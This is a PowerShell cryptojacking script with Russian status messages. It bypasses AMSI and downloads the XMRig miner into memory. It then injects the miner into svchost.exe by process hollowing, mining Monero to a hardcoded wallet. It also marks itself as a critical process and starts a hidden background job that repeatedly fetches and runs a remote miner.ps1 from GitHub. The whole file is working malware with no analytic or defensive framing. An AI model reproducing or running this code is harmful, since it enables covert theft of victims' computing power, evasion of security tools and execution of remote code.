try{$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiSession','NonPublic,Static');if($f){$f.SetValue($null,$null)}}catch{}

$worker="W-$(hostname)-$([Environment]::TickCount)"

$wallet="878rfYEi5WT32JwKXPmNSAi2S91WchiZnTsQbUPV9tUCR3ADEGTrTkZTu4exF6GiP6gqHFz4zZi5DE8V5jy2RYnLJvVwde6"
$args="-o gulf.moneroocean.stream:10128 -u $wallet -p $worker --tls --cpu-max-threads-hint=95 --randomx-1gb-pages --donate-level=1 -k --no-color"

Write-Host "[+] Скачиваем XMRig..." -ForegroundColor Green
$bytes = (New-Object Net.WebClient).DownloadData("https://github.com/MoneroOcean/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip")
Add-Type -A System.IO.Compression.FileSystem
$zip = [IO.Compression.ZipArchive][IO.MemoryStream]$bytes
$exe = [IO.MemoryStream]::new()
$zip.GetEntry("xmrig.exe").Open().CopyTo($exe)
$bytes = $exe.ToArray()

Write-Host "[+] Запуск через Process Hollowing в svchost.exe..." -ForegroundColor Green

$code = @'
using System;
using System.Runtime.InteropServices;
public class H {
    [DllImport("kernel32")] static extern bool CreateProcess(string a, string b, IntPtr c, IntPtr d, bool e, uint f, IntPtr g, string h, byte[] i, out PROCESS_INFORMATION j);
    [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32")] static extern bool GetThreadContext(IntPtr h, ref CONTEXT c);
    [DllImport("kernel32")] static extern bool SetThreadContext(IntPtr h, ref CONTEXT c);
    [DllImport("kernel32")] static extern uint ResumeThread(IntPtr h);
    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
    [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
    [StructLayout(LayoutKind.Sequential)] public struct CONTEXT { public uint ContextFlags; public uint Dr0; public uint Dr1; public uint Dr2; public uint Dr3; public uint Dr6; public uint Dr7; public FLOATING_SAVE_AREA FloatSave; public uint SegGs; public uint SegFs; public uint SegEs; public uint SegDs; public uint Edi; public uint Esi; public uint Ebx; public uint Edx; public uint Ecx; public uint Eax; public uint Ebp; public uint Eip; public uint SegCs; public uint EFlags; public uint Esp; public uint SegSs; public byte[] ExtendedRegisters; }
    [StructLayout(LayoutKind.Sequential)] public struct FLOATING_SAVE_AREA { public uint ControlWord; public uint StatusWord; public uint TagWord; public uint ErrorOffset; public uint ErrorSelector; public uint DataOffset; public uint DataSelector; public byte[] RegisterArea; public uint Cr0NpxState; }
    public static void Run(byte[] pe, string args) {
        STARTUPINFO si = new STARTUPINFO(); PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, BitConverter.GetBytes(0), out pi);
        CONTEXT ctx = new CONTEXT(); ctx.ContextFlags = 0x10007;
        GetThreadContext(pi.hThread, ref ctx);
        IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)pe.Length, 0x3000, 0x40);
        uint written; WriteProcessMemory(pi.hProcess, addr, pe, (uint)pe.Length, out written);
        WriteProcessMemory(pi.hProcess, ctx.Ebx + 8, BitConverter.GetBytes(addr.ToInt32() + 0x1000), 4, out written);
        ctx.Eax = (uint)(addr.ToInt32() + 0x1000);
        SetThreadContext(pi.hThread, ref ctx);
        ResumeThread(pi.hThread);
    }
}
'@
Add-Type $code
[H]::Run($bytes, $args)

Write-Host "[+] Майнер запущен в svchost.exe! Worker: $worker" -ForegroundColor Cyan

$imm = 'using System;using System.Runtime.InteropServices;public class I{[DllImport("ntdll")]static extern uint RtlAdjustPrivilege(int,bool,bool,out bool);[DllImport("ntdll")]static extern uint NtSetInformationProcess(IntPtr,int,ref int,int);public static void G(){bool b;RtlAdjustPrivilege(20,true,false,out b);int v=-1;NtSetInformationProcess((IntPtr)(-1),29,ref v,4);}}'
Add-Type $imm;[I]::G()
Start-Job {while(1){Start-Sleep 300;if(!(Get-Process svchost -ea 0|?{$_.CPU -gt 100})){powershell -nop -win hidden -c "IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fokisfisi-rgb/sisi/refs/heads/main/miner.ps1'))"}}}|Out-Null